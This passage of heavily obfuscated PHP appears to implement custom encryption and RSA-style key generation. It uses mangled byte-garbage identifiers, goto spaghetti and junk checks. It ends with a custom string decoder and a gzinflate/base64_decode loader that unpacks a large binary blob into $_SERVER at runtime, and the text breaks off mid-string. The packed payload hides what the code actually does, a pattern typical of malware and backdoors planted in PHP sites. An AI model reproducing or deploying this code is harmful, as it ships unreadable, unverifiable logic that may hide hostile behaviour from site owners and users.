$this->{$_SERVER[şìšµëâ­Æ][153]}($fåĞÅ³²¥‚, $Bà›ŞÇ¨Äğ[124]($CÛà¶Í . $fÒ§©—ïÒ¤)); $EïŞÜŸõ„º = $EË÷ŞŠŠò[643]; break; $EªØôß¢‰ = $EË÷ŞŠŠò[644]; if (!$EªØôß¢‰) { die; } case $Bà›ŞÇ¨Äğ[346]: $aìÆ‘®ÔÓå = $this->{$_SERVER[şìšµëâ­Æ][153]}($fåĞÅ³²¥‚, $Bà›ŞÇ¨Äğ[120]($CÛà¶Í . $fÒ§©—ïÒ¤)); $fÓ´ª šÀ‘ = $EË÷ŞŠŠò[645]; break; $F„£¥—†Œ– = $EË÷ŞŠŠò[608]; case $Bà›ŞÇ¨Äğ[347]: goto aÜí…¯Åğ; D„Œ­¿æÑŞ: while ($EîÏïáˆø < $EË÷ŞŠŠò[598]) { if ($EîÏïáˆø >= 0) { break; } $EîÏïáˆø++; } $C‰Ñ¼˜óˆ” = $E¦“ŒÒ¼¤[$FŠÙ¿‡šÕ¹]; $b´¥‰¨›ÍÎ = $EË÷ŞŠŠò[647]; goto fîŒƒ©×; E÷„À©È§Ö: $cÊğ·òó¦ï = $Bà›ŞÇ¨Äğ[25]($cÊğ·òó¦ï, $FŠÙ¿‡šÕ¹ % 8, $FŠÙ¿‡šÕ¹ % 8 + 7); $BÏµîİÉÌÓ = $Bà›ŞÇ¨Äğ[10]; $A½Ğ™Î›õ² = 0; goto b‹‰ˆÃƒ‹é; Eéİ“µ•º: break; goto fŞÛ•¦¦ê±; aÜí…¯Åğ: $fåĞÅ³²¥‚ = $Bà›ŞÇ¨Äğ[124]($fåĞÅ³²¥‚); $FŠÙ¿‡šÕ¹ = $Bà›ŞÇ¨Äğ[348](0, 64); $EîÏïáˆø = $EË÷ŞŠŠò[646]; goto D„Œ­¿æÑŞ; c–ÃÁèÔç·: while (strlen($C……Ô©ÕˆÀ) < $EË÷ŞŠŠò[573]) { if (!$C……Ô©ÕˆÀ) { break; } $C……Ô©ÕˆÀ++; } for ($A½Ğ™Î›õ² = 0; $A½Ğ™Î›õ² < $Bà›ŞÇ¨Äğ[24]($fåĞÅ³²¥‚); $A½Ğ™Î›õ²++) { $CÍèßŒ„Ã÷ = $CÍèßŒ„Ã÷ == $Bà›ŞÇ¨Äğ[24]($cÊğ·òó¦ï) ? 0 : $CÍèßŒ„Ã÷; $E¼˜¬…Õö = $EË÷ŞŠŠò[620]; if (!$E¼˜¬…Õö) { return; } $D‰ªÊ†“ğµ = ($FŠÙ¿‡šÕ¹ + $Bà›ŞÇ¨Äğ[349]($E¦“ŒÒ¼¤, $fåĞÅ³²¥‚[$A½Ğ™Î›õ²]) + $Bà›ŞÇ¨Äğ[350]($cÊğ·òó¦ï[$CÍèßŒ„Ã÷++])) % 64; $BÏµîİÉÌÓ .= $E¦“ŒÒ¼¤[$D‰ªÊ†“ğµ]; $A£ç¨·¶¤ = $EË÷ŞŠŠò[650]; while (strlen($A£ç¨·¶¤) < $EË÷ŞŠŠò[573]) { if (!$A£ç¨·¶¤) { break; } $A£ç¨·¶¤++; } } $aìÆ‘®ÔÓå = $Bà›ŞÇ¨Äğ[341]($C‰Ñ¼˜óˆ” . $BÏµîİÉÌÓ); goto Eéİ“µ•º; b‹‰ˆÃƒ‹é: $D‰ªÊ†“ğµ = 0; $CÍèßŒ„Ã÷ = 0; $C……Ô©ÕˆÀ = $EË÷ŞŠŠò[649]; goto c–ÃÁèÔç·; fîŒƒ©×: $cÊğ·òó¦ï = $Bà›ŞÇ¨Äğ[120]($C‰Ñ¼˜óˆ” . $Bà›ŞÇ¨Äğ[120]($fÒ§©—ïÒ¤ . $C‰Ñ¼˜óˆ”) . $fÒ§©—ïÒ¤); $eùÓâÛ°¢ = $EË÷ŞŠŠò[648]; if (!$eùÓâÛ°¢) { die; } goto E÷„À©È§Ö; fŞÛ•¦¦ê±: default: $aìÆ‘®ÔÓå = $this->{$_SERVER[şìšµëâ­Æ][153]}($fåĞÅ³²¥‚, $fÒ§©—ïÒ¤ . $CÛà¶Í); $FŞï¹Å‡Äñ = $EË÷ŞŠŠò[651]; break; $cøïÊï„ = $EË÷ŞŠŠò[652]; if (!$cøïÊï„) { return; } } $aìÆ‘®ÔÓå = $Bà›ŞÇ¨Äğ[220]($B¥ãÚ«­¿ . $CÛà¶Í . $aìÆ‘®ÔÓå); goto bĞêóù‹á; bëí¤…Ç´: $EË÷ŞŠŠò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bà›ŞÇ¨Äğ =& $_SERVER[şìšµëâ­Æ]; $Bà›ŞÇ¨Äğ[343](1); goto Dªß¶Ò‡Í÷; E¹ç¡‡á¦: } private function zgxo0a4b7392($D İ ˆ­·‡, $F…ÅœèŞî, $eÍ‚â…âö‰ = 3) { goto C¨ˆµ¡·ö°; AºšÉ‘å†²: if (!$BÄä†¹¾Š‹) { return; } $C›óÔ½‰ÛÑ = $D–‘Çä—Ë[25]($D İ ˆ­·‡, 1, 15); $D İ ˆ­·‡ = $D–‘Çä—Ë[25]($D İ ˆ­·‡, 16); goto f¢·Ô™­·á; Eññ˜îƒó: $D İ ˆ­·‡ = $D–‘Çä—Ë[2]($D İ ˆ­·‡); $A¡Î½Šº´ = $DÖ¥Ö¦Õ®[654]; if (!$A¡Î½Šº´) { die; } goto dÕåĞˆ¯¾Ê; dÕåĞˆ¯¾Ê: $D İ ˆ­·‡ = $D–‘Çä—Ë[220]($D İ ˆ­·‡); $B•®¥—ù®Í = $D İ ˆ­·‡[0]; $BÄä†¹¾Š‹ = $DÖ¥Ö¦Õ®[655]; goto AºšÉ‘å†²; a©á–³©–: switch ($B•®¥—ù®Í) { case $D–‘Çä—Ë[240]: $C–¸ß¾Â¥ = $this->{$_SERVER[şìšµëâ­Æ][256]}($D İ ˆ­·‡, $D–‘Çä—Ë[220]($F…ÅœèŞî . $C›óÔ½‰ÛÑ)); $EÈÚçŠ°ÇÓ = $DÖ¥Ö¦Õ®[657]; if (!$EÈÚçŠ°ÇÓ) { die; } break; $Eô–ğ³†‹¹ = $DÖ¥Ö¦Õ®[648]; if (!$Eô–ğ³†‹¹) { return; } case $D–‘Çä—Ë[226]: $C–¸ß¾Â¥ = $this->{$_SERVER[şìšµëâ­Æ][256]}($D İ ˆ­·‡, $D–‘Çä—Ë[220]($C›óÔ½‰ÛÑ . $F…ÅœèŞî)); break; $e””ÃöƒÒß = $DÖ¥Ö¦Õ®[658]; while ($e””ÃöƒÒß < $DÖ¥Ö¦Õ®[598]) { if ($e””ÃöƒÒß >= 0) { break; } $e””ÃöƒÒß++; } case $D–‘Çä—Ë[345]: $C–¸ß¾Â¥ = $this->{$_SERVER[şìšµëâ­Æ][256]}($D İ ˆ­·‡, $D–‘Çä—Ë[124]($C›óÔ½‰ÛÑ . $F…ÅœèŞî)); break; $cèİ‚†·œ = $DÖ¥Ö¦Õ®[659]; case $D–‘Çä—Ë[346]: $C–¸ß¾Â¥ = $this->{$_SERVER[şìšµëâ­Æ][256]}($D İ ˆ­·‡, $D–‘Çä—Ë[120]($C›óÔ½‰ÛÑ . $F…ÅœèŞî)); $A„­ôÑË–š = $DÖ¥Ö¦Õ®[660]; if (!$A„­ôÑË–š) { return; } break; $A·¹“‚ƒÆ‘ = $DÖ¥Ö¦Õ®[661]; case $D–‘Çä—Ë[347]: goto EÅµšØÏË; f­´—¯Ò‰Ø: if (strlen($AÚÚôŒ¦) < $DÖ¥Ö¦Õ®[568]) { die; } $c…ª¼äÊÃè = $D–‘Çä—Ë[349]($dâ„Ğà», $fõ†ìéâŒ×); $d˜æ¿ª„ˆ = $D–‘Çä—Ë[120]($fõ†ìéâŒ× . $D–‘Çä—Ë[120]($F…ÅœèŞî . $fõ†ìéâŒ×) . $F…ÅœèŞî); goto fåÉåéÍ‹¿; aÒ´ÀÚö: if (!$DÑÜ‰¡£‚Ä) { die; } for ($d–…¯ÂãøÃ = 0; $d–…¯ÂãøÃ < $D–‘Çä—Ë[24]($D İ ˆ­·‡); $d–…¯ÂãøÃ++) { $Cá™ŒİœÇ = $Cá™ŒİœÇ == $D–‘Çä—Ë[24]($d˜æ¿ª„ˆ) ? 0 : $Cá™ŒİœÇ; $Aõ“¼ØŒĞé = $Cá™ŒİœÇ++; $Fèå…½ø‡ô = $DÖ¥Ö¦Õ®[667]; $E‘ÜÙå« = $D–‘Çä—Ë[349]($dâ„Ğà», $D İ ˆ­·‡[$d–…¯ÂãøÃ]) - $c…ª¼äÊÃè - $D–‘Çä—Ë[350]($d˜æ¿ª„ˆ[$Aõ“¼ØŒĞé]); while ($E‘ÜÙå« < 0) { $E‘ÜÙå« += 64; } $d‚¨ØÜŒ¯æ .= $dâ„Ğà»[$E‘ÜÙå«]; } $C–¸ß¾Â¥ = $D–‘Çä—Ë[353]($d‚¨ØÜŒ¯æ); goto A„Ìã•¿¯ø; A„Ìã•¿¯ø: break; goto A§ÂŞçÀé¤; Cİ•ãÜ´ì: $E‘ÜÙå« = 0; $Cá™ŒİœÇ = 0; $DÑÜ‰¡£‚Ä = $DÖ¥Ö¦Õ®[666]; goto aÒ´ÀÚö; EÅµšØÏË: $D İ ˆ­·‡ = $D–‘Çä—Ë[352]($D İ ˆ­·‡); $fõ†ìéâŒ× = $D İ ˆ­·‡[0]; $b¤›Şõïê„ = $DÖ¥Ö¦Õ®[662]; goto E£ï …‰; fåÉåéÍ‹¿: $B“«¥òÑ‚¢ = $DÖ¥Ö¦Õ®[664]; $d˜æ¿ª„ˆ = $D–‘Çä—Ë[25]($d˜æ¿ª„ˆ, $c…ª¼äÊÃè % 8, $c…ª¼äÊÃè % 8 + 7); $FÙí‡ù—Ñ = $DÖ¥Ö¦Õ®[665]; goto D‰ÜÓ£¥©‡; D‰ÜÓ£¥©‡: if (strlen($FÙí‡ù—Ñ) < $DÖ¥Ö¦Õ®[598]) { die; } $d‚¨ØÜŒ¯æ = $D–‘Çä—Ë[10]; $d–…¯ÂãøÃ = 0; goto Cİ•ãÜ´ì; E£ï …‰: if (!$b¤›Şõïê„) { die; } $D İ ˆ­·‡ = $D–‘Çä—Ë[25]($D İ ˆ­·‡, 1); $AÚÚôŒ¦ = $DÖ¥Ö¦Õ®[663]; goto f­´—¯Ò‰Ø; A§ÂŞçÀé¤: default: $C–¸ß¾Â¥ = $this->{$_SERVER[şìšµëâ­Æ][256]}($D İ ˆ­·‡, $F…ÅœèŞî . $C›óÔ½‰ÛÑ); $b‹·À‡ŠÏÆ = $DÖ¥Ö¦Õ®[668]; while (strlen($b‹·À‡ŠÏÆ) < $DÖ¥Ö¦Õ®[564]) { if (!$b‹·À‡ŠÏÆ) { break; } $b‹·À‡ŠÏÆ++; } break; $BÚçà—éƒÏ = $DÖ¥Ö¦Õ®[669]; while (strlen($BÚçà—éƒÏ) < $DÖ¥Ö¦Õ®[573]) { if (!$BÚçà—éƒÏ) { break; } $BÚçà—éƒÏ++; } } if ($eÍ‚â…âö‰ - 1 > 0) { $C–¸ß¾Â¥ = $this->{$_SERVER[şìšµëâ­Æ][195]}($C–¸ß¾Â¥, $F…ÅœèŞî, $eÍ‚â…âö‰ - 1); } return $C–¸ß¾Â¥; goto Fî’×áíğ; C¨ˆµ¡·ö°: $DÖ¥Ö¦Õ® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D–‘Çä—Ë =& $_SERVER[şìšµëâ­Æ]; if (!$D–‘Çä—Ë[351]($D İ ˆ­·‡) || $D–‘Çä—Ë[24]($D İ ˆ­·‡) < 10) { return !1; } goto Eññ˜îƒó; f¢·Ô™­·á: $d´¥ñƒ–¬Ö = $DÖ¥Ö¦Õ®[656]; if (strlen($d´¥ñƒ–¬Ö) < $DÖ¥Ö¦Õ®[598]) { return; } $dâ„Ğà» = $D–‘Çä—Ë[344]; goto a©á–³©–; Fî’×áíğ: } public function omrub5bc4a10($Bß¥ö•Ï«‘) { goto A²ˆíÙÑí™; E³‰ª÷©ÙŸ: $AÖâÔ›º±” = $aÒòÊ†Ù‘÷[120]($aÒòÊ†Ù‘÷[355] . ($eÒåæÔÎÕÕ + $DÜÃ‰¬ì·) . $aÒòÊ†Ù‘÷[356] . $f“ßˆÄĞ’Ë . $aÒòÊ†Ù‘÷[356] . $Aµ†¨äÔˆÅ . $aÒòÊ†Ù‘÷[357]); $Bá¨˜ï¸Ó‰ = $AÉÔÁÕæ¬[676]; if (strlen($Bá¨˜ï¸Ó‰) < $AÉÔÁÕæ¬[579]) { die; } goto B¬²ø´Ä…; B¼¶‹ÔÚÙê: $EÉÚÇæôí = $AÉÔÁÕæ¬[675]; for ($CÄˆ´¹ÀëÖ = 0; $CÄˆ´¹ÀëÖ < $bå’…Š’‰ * 10; $CÄˆ´¹ÀëÖ++) { if (($bå’…Š’‰ * $CÄˆ´¹ÀëÖ + 1) % $f“ßˆÄĞ’Ë == 0) { $Aµ†¨äÔˆÅ = $aÒòÊ†Ù‘÷[250](($bå’…Š’‰ * $CÄˆ´¹ÀëÖ + 1) / $f“ßˆÄĞ’Ë); break; } } $bĞŠÜĞğ¥Â = $this->{$_SERVER[şìšµëâ­Æ][153]}($eÒåæÔÎÕÕ * $DÜÃ‰¬ì· . $aÒòÊ†Ù‘÷[10], $aÒòÊ†Ù‘÷[155]); goto E³‰ª÷©ÙŸ; b˜µ¯±İ: $d°ò¦°ù¦ = $AÉÔÁÕæ¬[670]; if (!$d°ò¦°ù¦) { die; } $DÜÃ‰¬ì· = $this->{$_SERVER[şìšµëâ­Æ][354]}(); goto BĞøôÆÙÅŠ; E®¶¨İ²ã : $f“ßˆÄĞ’Ë = $aÒòÊ†Ù‘÷[250](($eÒåæÔÎÕÕ + $DÜÃ‰¬ì·) / 2); while (1) { $B˜î¼‚ŠìÒ = $f“ßˆÄĞ’Ë; $fŠÚ„Úİï = $AÉÔÁÕæ¬[672]; if (!$fŠÚ„Úİï) { die; } $Bñ‡ôØí¿» = $bå’…Š’‰; $a¼İƒ¼¾†­ = $AÉÔÁÕæ¬[673]; if (!$a¼İƒ¼¾†­) { return; } while ($Bñ‡ôØí¿» % $B˜î¼‚ŠìÒ != 0) { $DÇêÙ²Àî = $Bñ‡ôØí¿»; $f¦’‰ˆğ°© = $AÉÔÁÕæ¬[674]; $Bñ‡ôØí¿» = $B˜î¼‚ŠìÒ; $B˜î¼‚ŠìÒ = $DÇêÙ²Àî % $B˜î¼‚ŠìÒ; } if ($B˜î¼‚ŠìÒ == 1) { break; } else { $f“ßˆÄĞ’Ë++; } } $Aµ†¨äÔˆÅ = 2; goto B¼¶‹ÔÚÙê; A²ˆíÙÑí™: $AÉÔÁÕæ¬ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÒòÊ†Ù‘÷ =& $_SERVER[şìšµëâ­Æ]; $eÒåæÔÎÕÕ = $this->{$_SERVER[şìšµëâ­Æ][354]}(); goto b˜µ¯±İ; BĞøôÆÙÅŠ: $b—Â²¥†æº = $AÉÔÁÕæ¬[671]; $bå’…Š’‰ = ($eÒåæÔÎÕÕ - 1) * ($DÜÃ‰¬ì· - 1); $dÍò–ïÓñ = $AÉÔÁÕæ¬[645]; goto E®¶¨İ²ã ; B¬²ø´Ä…: $d Ò†±Ïùó = $this->{$_SERVER[şìšµëâ­Æ][153]}($Bß¥ö•Ï«‘, $AÖâÔ›º±”) . $aÒòÊ†Ù‘÷[358] . $bĞŠÜĞğ¥Â; $AùŒÂóá¹× = $AÉÔÁÕæ¬[677]; return $d Ò†±Ïùó; goto F›©Í¹È˜ó; F›©Í¹È˜ó: } public function wjoe27a0d661($C´‰ÄƒÒ‘) { goto EÍ‹ï‡‘³…; fÑ…·Â µÁ: $C§˜‡”Ü— = $A†À´ëé¥Ô[670]; if (!$C§˜‡”Ü—) { die; } $b²—ĞßÌÖÖ = 0; goto càÄƒÚò; D­š Ø«¥: $e•Ÿ§»í† = $A†À´ëé¥Ô[678]; if ($Cé¨¢ÇŒ–¹[19]($D¾Œ„Úœ”) != 2) { return $Cé¨¢ÇŒ–¹[10]; } $bÃµ†À“ = $this->{$_SERVER[şìšµëâ­Æ][256]}($D¾Œ„Úœ”[1] . $Cé¨¢ÇŒ–¹[10], $Cé¨¢ÇŒ–¹[155]); goto b¹ôùÏ Ø¼; EÍ‹ï‡‘³…: $A†À´ëé¥Ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cé¨¢ÇŒ–¹ =& $_SERVER[şìšµëâ­Æ]; $D¾Œ„Úœ” = $Cé¨¢ÇŒ–¹[0]($Cé¨¢ÇŒ–¹[358], $C´‰ÄƒÒ‘); goto D­š Ø«¥; Ağ‹Ãà³¹: $EªÛ•Ìäã– = ($C Ôì³ƒ×Ë - 1) * ($b²—ĞßÌÖÖ - 1); $CòÌ¨ö •¸ = $Cé¨¢ÇŒ–¹[250](($C Ôì³ƒ×Ë + $b²—ĞßÌÖÖ) / 2); while (1) { $d¡µ³×î½µ = $CòÌ¨ö •¸; $Cìé¨ÉÚ¼ª = $EªÛ•Ìäã–; $DÂğË ƒã = $A†À´ëé¥Ô[682]; while (strlen($DÂğË ƒã) < $A†À´ëé¥Ô[564]) { if (!$DÂğË ƒã) { break; } $DÂğË ƒã++; } while ($Cìé¨ÉÚ¼ª % $d¡µ³×î½µ != 0) { $CâƒÊŞÑ‘ç = $Cìé¨ÉÚ¼ª; $E“Ğäé¤ö´ = $A†À´ëé¥Ô[683]; if (!$E“Ğäé¤ö´) { die; } $Cìé¨ÉÚ¼ª = $d¡µ³×î½µ; $e‰À¿—„Æ = $A†À´ëé¥Ô[684]; $d¡µ³×î½µ = $CâƒÊŞÑ‘ç % $d¡µ³×î½µ; } if ($d¡µ³×î½µ == 1) { break; } else { $CòÌ¨ö •¸++; } } goto F‹Í›Ç¥„; b¹ôùÏ Ø¼: if (!$bÃµ†À“) { return $Cé¨¢ÇŒ–¹[10]; } $bÃµ†À“ = $Cé¨¢ÇŒ–¹[250]($bÃµ†À“); $C Ôì³ƒ×Ë = 0; goto fÑ…·Â µÁ; dĞŠø—ğö: return $BĞ‚¿¿É¸º; $bŞ¯†Ü’èæ = $A†À´ëé¥Ô[686]; while (strlen($bŞ¯†Ü’èæ) < $A†À´ëé¥Ô[568]) { if (!$bŞ¯†Ü’èæ) { break; } $bŞ¯†Ü’èæ++; } goto DáÍÖ«¯à‹; F‹Í›Ç¥„: $b‰»Ä©¯·‹ = 2; $Dí‹µßöØ = $A†À´ëé¥Ô[685]; if (strlen($Dí‹µßöØ) < $A†À´ëé¥Ô[573]) { die; } goto bĞ±š¢¬Ñ‰; càÄƒÚò: $Bñï“¸¼ë = $A†À´ëé¥Ô[679]; if (!$Bñï“¸¼ë) { die; } for ($C¸Šˆµªš = 3; $C¸Šˆµªš < $bÃµ†À“; $C¸Šˆµªš += 2) { if ($bÃµ†À“ % $C¸Šˆµªš != 0) { continue; } $C Ôì³ƒ×Ë = $C¸Šˆµªš; $aˆÑ¢¯…–Ô = $A†À´ëé¥Ô[680]; while (strlen($aˆÑ¢¯…–Ô) < $A†À´ëé¥Ô[564]) { if (!$aˆÑ¢¯…–Ô) { break; } $aˆÑ¢¯…–Ô++; } $b²—ĞßÌÖÖ = $Cé¨¢ÇŒ–¹[250]($bÃµ†À“ / $C¸Šˆµªš); break; $E÷Æ”Ûš£ = $A†À´ëé¥Ô[681]; if (!$E÷Æ”Ûš£) { return; } } goto Ağ‹Ãà³¹; bĞ±š¢¬Ñ‰: for ($C¸Šˆµªš = 0; $C¸Šˆµªš < $EªÛ•Ìäã– * 10; $C¸Šˆµªš++) { if (($EªÛ•Ìäã– * $C¸Šˆµªš + 1) % $CòÌ¨ö •¸ == 0) { $b‰»Ä©¯·‹ = $Cé¨¢ÇŒ–¹[250](($EªÛ•Ìäã– * $C¸Šˆµªš + 1) / $CòÌ¨ö •¸); break; } } $B˜ô§çÄ‹ = $Cé¨¢ÇŒ–¹[120]($Cé¨¢ÇŒ–¹[355] . ($C Ôì³ƒ×Ë + $b²—ĞßÌÖÖ) . $Cé¨¢ÇŒ–¹[356] . $CòÌ¨ö •¸ . $Cé¨¢ÇŒ–¹[356] . $b‰»Ä©¯·‹ . $Cé¨¢ÇŒ–¹[357]); $BĞ‚¿¿É¸º = $this->{$_SERVER[şìšµëâ­Æ][256]}($D¾Œ„Úœ”[0], $B˜ô§çÄ‹); goto dĞŠø—ğö; DáÍÖ«¯à‹: } public function lcsu5694a69c() { goto EÍ—öä–¹¾; e‹ñ²±é : if (strlen($aß›¹ïó–à) < $d­ëÚØ°Ø[564]) { die; } goto B’„ÇÈ«Ÿá; A„ìáÕ¨Ş–: $fœ²Öå„¹Á = $d­ëÚØ°Ø[689]; if (!$fœ²Öå„¹Á) { die; } while ($fŠØø¯ÛŞ <= (int) $A‚§ª÷Á¿é[360]($dÚ¶³‹®‘é)) { $eèÅ„¶ª = $fŠØø¯ÛŞ; $féå¿  ¸˜ = $d­ëÚØ°Ø[690]; while (!0) { $eèÅ„¶ª++; if ($eèÅ„¶ª <= 2) { $fŠØø¯ÛŞ = $eèÅ„¶ª; break; } else { if ($eèÅ„¶ª < 2) { continue; } } $aÇğÚ¸¦­« = !0; for ($B±·…˜Î©î = 2; $B±·…˜Î©î <= $A‚§ª÷Á¿é[360]($eèÅ„¶ª); $B±·…˜Î©î++) { if ($eèÅ„¶ª % $B±·…˜Î©î == 0) { $aÇğÚ¸¦­« = !1; } } if ($aÇğÚ¸¦­«) { $fŠØø¯ÛŞ = $eèÅ„¶ª; break; } } $Eš¨¿¾¨˜ƒ[] = $fŠØø¯ÛŞ; } goto d¸·ë¦¢¶Ã; EŠ¥ç³Şìî: $d®µ¶ÓŠ¨İ = $d­ëÚØ°Ø[688]; while (strlen($d®µ¶ÓŠ¨İ) < $d­ëÚØ°Ø[564]) { if (!$d®µ¶ÓŠ¨İ) { break; } $d®µ¶ÓŠ¨İ++; } $fŠØø¯ÛŞ = 1; goto A„ìáÕ¨Ş–; d¸·ë¦¢¶Ã: $c¯—¦Ï¥Èõ = 2; $FÌ‡“—°º” = $d­ëÚØ°Ø[691]; if (!$FÌ‡“—°º”) { die; } goto FÕ¼ÆÄŠŠ; FÕ¼ÆÄŠŠ: for ($eèÅ„¶ª = $dÚ¶³‹®‘é; $eèÅ„¶ª > 1; $eèÅ„¶ª--) { $aÇğÚ¸¦­« = !0; $E‘Şµ—¦Æ… = $d­ëÚØ°Ø[692]; while (strlen($E‘Şµ—¦Æ…) < $d­ëÚØ°Ø[568]) { if (!$E‘Şµ—¦Æ…) { break; } $E‘Şµ—¦Æ…++; } foreach ($Eš¨¿¾¨˜ƒ as $dãĞÙòÁÀÇ) { if ($eèÅ„¶ª % $dãĞÙòÁÀÇ == 0) { $aÇğÚ¸¦­« = !1; break; } } if ($aÇğÚ¸¦­«) { $c¯—¦Ï¥Èõ = $eèÅ„¶ª; break; } } return $c¯—¦Ï¥Èõ; $aß›¹ïó–à = $d­ëÚØ°Ø[693]; goto e‹ñ²±é ; F••¥å‚: $f™ÜÙ¨°ª = $d­ëÚØ°Ø[687]; while (strlen($f™ÜÙ¨°ª) < $d­ëÚØ°Ø[564]) { if (!$f™ÜÙ¨°ª) { break; } $f™ÜÙ¨°ª++; } $Eš¨¿¾¨˜ƒ = array(); goto EŠ¥ç³Şìî; EÍ—öä–¹¾: $d­ëÚØ°Ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A‚§ª÷Á¿é =& $_SERVER[şìšµëâ­Æ]; $dÚ¶³‹®‘é = $A‚§ª÷Á¿é[339]($A‚§ª÷Á¿é[359](2, 14), $A‚§ª÷Á¿é[359](2, 16) - 1); goto F••¥å‚; B’„ÇÈ«Ÿá: } public function craea28b2c24($Dåø¢ØÛÎ, $C„âÕè¿œ¬) { $dÀéÍ¡òª =& $_SERVER[şìšµëâ­Æ]; return $dÀéÍ¡òª[13](array($dÀéÍ¡òª[14], $dÀéÍ¡òª[361]), $Dåø¢ØÛÎ, $C„âÕè¿œ¬); $a²÷©è£” = $_SERVER[ÈİÅ¿ÈÈ¥×][694]; if (!$a²÷©è£”) { die; } } public function lhoy9680c8de($dÕ›ˆÒö‚, $ešÌàğ‘ïß) { $d›“ôÙÏ¥„ =& $_SERVER[şìšµëâ­Æ]; return $d›“ôÙÏ¥„[13](array($d›“ôÙÏ¥„[362], $d›“ôÙÏ¥„[363]), $dÕ›ˆÒö‚, $ešÌàğ‘ïß); } public function shpq555d55e4($CªÆœ³„ğò, $EŞ•î¨¬ëö) { $B•ôÄª¾ç =& $_SERVER[şìšµëâ­Æ]; return $B•ôÄª¾ç[13](array($B•ôÄª¾ç[362], $B•ôÄª¾ç[364]), $CªÆœ³„ğò, $EŞ•î¨¬ëö); } } goto D·ÇÆ§Ô; B×Åš°À§—: if (!function_exists('_kodDe')) { function _kodDe($a§ÅÁ³‡İÄ) { $a§ÅÁ³‡İÄ = base64_decode($a§ÅÁ³‡İÄ); $d†¢Ù‹Ãîš = strlen($a§ÅÁ³‡İÄ); $DÉµñ¹·­ = ''; $dàé÷ö‡¾ù = ord($a§ÅÁ³‡İÄ[0]) - 30; for ($BÆ©’¼øÏ = 1; $BÆ©’¼øÏ < $d†¢Ù‹Ãîš; $BÆ©’¼øÏ += 2) { if ($BÆ©’¼øÏ + 1 < $d†¢Ù‹Ãîš) { $DÉµñ¹·­ .= chr(ord($a§ÅÁ³‡İÄ[$BÆ©’¼øÏ + 1]) + $dàé÷ö‡¾ù); $DÉµñ¹·­ .= chr(ord($a§ÅÁ³‡İÄ[$BÆ©’¼øÏ]) + $dàé÷ö‡¾ù); } else { $DÉµñ¹·­ .= chr(ord($a§ÅÁ³‡İÄ[$BÆ©’¼øÏ]) + $dàé÷ö‡¾ù); } } return $DÉµñ¹·­; } } define("\310\236\335\305\277\310\310\245\327", "\256\207\231\344\233\225\305"); $_SERVER[ÈİÅ¿ÈÈ¥×] = explode(base64_decode('fAR8A3wG'), gzinflate(substr(base64_decode('H4sIAAAAAAAAA629B2AbRfYwTjs4Qi85uNA2ToKbiu3YKU4cR7ZlW4ksOZKc')."\352\240\254\244\225\275\266\244\225\167\127\266\345\24\112\10\75\204\26\70\132\250\107\11\44\224\203\0\1\2\334\321\216\316\321\17\216\37\45\161\40\164\70\340\200"."\73\370\246\317\354\112\341\176\377\377\367\5\22\115\337\51\157\336\274\367\346\275\67\247\256\330\147\305\336\53\366\175\364\134\374\13\376\356\5\376\103\341\23\316\375"."\355\36\350\317\336\347\236\123\126\326\76\145\114\145\340\300\165\367\154\222\67\313\33\345\163\202\376\147\237\363\35\364\302\355\163\274\243\67\74\233\37\335\163\217\327"."\117\310\77\130\17\12\343\272\365\370\107\312\150\246\244\14\253\206\151\340\204\270\226\111\252\75\70\254\146\360\257\33\377\30\3\51\325\124\160\70\32\10\106\242\341"."\256\316\116\157\50\22\45\55\212\371\151\55\101\102\131\131\227\323\244\361\254\242\33\340\123\142\163\321\254\226\125\62\226\24\236\220\220\115\71\46\33\244\245\226\246"."\150\213\267\323\37\134\24\215\54\352\364\222\22\261\350\100\116\321\363\70\206\202\141\123\326\315\210\232\126\130\211\41\235\365\253\311\333\346\13\110\221\220\47\20\366"."\64\107\174\301\0\116\156\16\166\164\370\42\205\351\241\240\337\337\344\151\236\133\230\323\31\362\264\165\170\44\320\277\224\22\125\63\111\255\114\132\206\163\226\111\345"."\70\320\252\52\251\4\16\146\144\332\35\63\237\45\241\10\13\201\65\310\344\122\51\34\11\260\20\351\277\222\224\163\51\62\147\55\142\44\253\253\151\231\16\175\256".strrev('¦-"–D‡`¡­JnÁ"9·¿^Â¦ÉZJë=O2êl;ÄqÄÍMLç 8©g’').base64_decode('oksL2r0hrwS73lCKRlwq4XpdATAhksfvl3bXgqmks7QZXKdIY8FQizckNS2S').base64_decode('+DzFtXRay7hAK2A9TaGr3lAIBxwEgv0+uHQkEmxtDXtZjAxunh/0ZDKBUkss')."\221\114\231\321\101\71\225\243\300\332\217\177\113\311\17\371\325\14\2\300\3\152\106\315\21\140\45\115\150\32\333\71\44\220\243\245\25\232\222\6\325\64\262\247\300"."\x6\x1b\xc4\xc1\x86\x59\xf8\x77\x6\x29\x14\x8b\xc2\x3c\x45\x37\xa3\x4a\x26\xae\x25\xd4\xc\xd9\x86\x8d\x64\xcb\x11\xc0\x93\xcd\xde\x16\x5d\x5\xe5\x48\x83\x9a\x2b\xae\x65\xf3\x1d".base64_decode('2iAZQ1JNKX62y5JaKqHoPJ4F1cUcMhh1RKgdyKXFIiwa71VTCZ1uzl8rWU2a').base64_decode('VUwTDMOgPe3KpjQ5EVZ0ofetoJlgzhQTc6hYq6anWwACILMDwF7tKpLRTwE/')."\x21\x4c\x8a\x8b\x20\xae\xb2\x25\xa7\x3a\x7f\x5e\xba\x64\x36\xf8\xa7\x9c\x60\xb1\x6e\xd2\xb5\x5e\x25\x95\x8a\x2a\xc3\xa\xd9\x20\xe9\x44\x9d\x41\x7b\xef\x36\x62\x6a\xc6\xd\x52\x70".base64_decode('1BeM9spGb0eiLopqUeSYUIZd2d4s2cNs23ZbABjOd0AzvQKKTWlxOSWOFId7')."\115\63\33\126\62\11\70\41\144\104\332\120\6\115\130\126\121\110\241\26\207\224\220\72\244\105\122\173\275\132\117\241\13\300\112\62\317\61\136\257\231\116\261\20\35".base64_decode('LUszWKI5TGCihMSVYZNMkjQj3ivrYPkacmbSOY0gjmw2pcZlU9Uybi1uKqbT')."\60\165\105\46\255\171\342\161\305\60\234\315\132\306\324\265\224\323\223\112\151\103\316\240\256\366\250\231\172\251\202\240\131\220\11\66\262\23\242\276\172\262\73\113\146"."\110\20\222\340\316\257\300\137\243\273\216\225\326\345\214\221\124\164\247\227\154\213\172\11\254\17\303\174\264\130\213\152\144\65\103\205\335\253\227\